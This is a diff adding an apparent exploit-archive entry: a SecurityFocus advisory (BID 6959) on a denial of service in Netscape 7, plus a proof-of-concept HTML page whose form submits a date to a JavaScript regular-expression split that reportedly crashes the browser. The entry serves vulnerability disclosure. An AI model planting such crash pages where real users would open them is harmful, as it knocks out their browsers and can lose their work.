@@ -1,0 +1,29 @@
+source: http://www.securityfocus.com/bid/6959/info
+
+It has been reported that Netscape based browsers may be vulnerable to a denial of service condition when executing certain JavaScript methods.
+
+If a malicious page containing a specially crafted JavaScript regular expression method is viewed the browser reportedly becomes un-stable this may result in the critical failure of an affected browser.
+
+This vulnerability was reported for Netscape version 7. It is not known if previous versions are also affected. 
+
+<html>
+<head>
+<title>test</title>
+<--script-- language="JavaScript">
+function reformatDate(someDate) {
+var tokens = someDate.split(/(\/|-)/);
+if (tokens[1].length == 1) tokens[1] = "0" + tokens[1];
+if (tokens[0].length == 1) tokens[0] = "0" + tokens[0];
+var result = tokens[2] + tokens[1] + tokens[0];
+alert(result);
+//return result;
+}
+</--script-->
+</head>
+<body>
+<form action="" method="GET" name="form1" onSubmit="return reformatDate(this.dt.value);">
+MM/DD/YYYY - <input type=text name=dt>
+<input type=submit>
+</form>
+</body>
+</html> 
